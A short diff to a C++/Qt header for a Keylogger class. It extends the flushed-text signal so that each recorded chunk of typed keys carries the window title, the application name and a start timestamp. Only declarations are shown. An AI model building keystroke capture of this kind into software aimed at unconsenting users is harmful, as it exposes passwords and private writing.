@@ -36,7 +36,10 @@ public:
     int consumeActivityCount();
 
 signals:
-    void textFlushed(const QString &windowTitle, const QString &text);
+    // One recorded keylogger chunk: the keys typed into one window of one
+    // program, from the first key (beginMs) until it was flushed.
+    void textFlushed(const QString &windowTitle, const QString &text, qint64 beginMs,
+                     const QString &application);
 
 private slots:
     void flush();
@@ -54,7 +57,9 @@ private:
 
     QTimer m_flushTimer;
     QString m_pendingWindowTitle;
+    QString m_pendingApplication;
     QString m_pendingText;
+    qint64 m_pendingBeginMs = 0;
     std::atomic<int> m_activityCount{0};
 
     static Keylogger *s_instance;
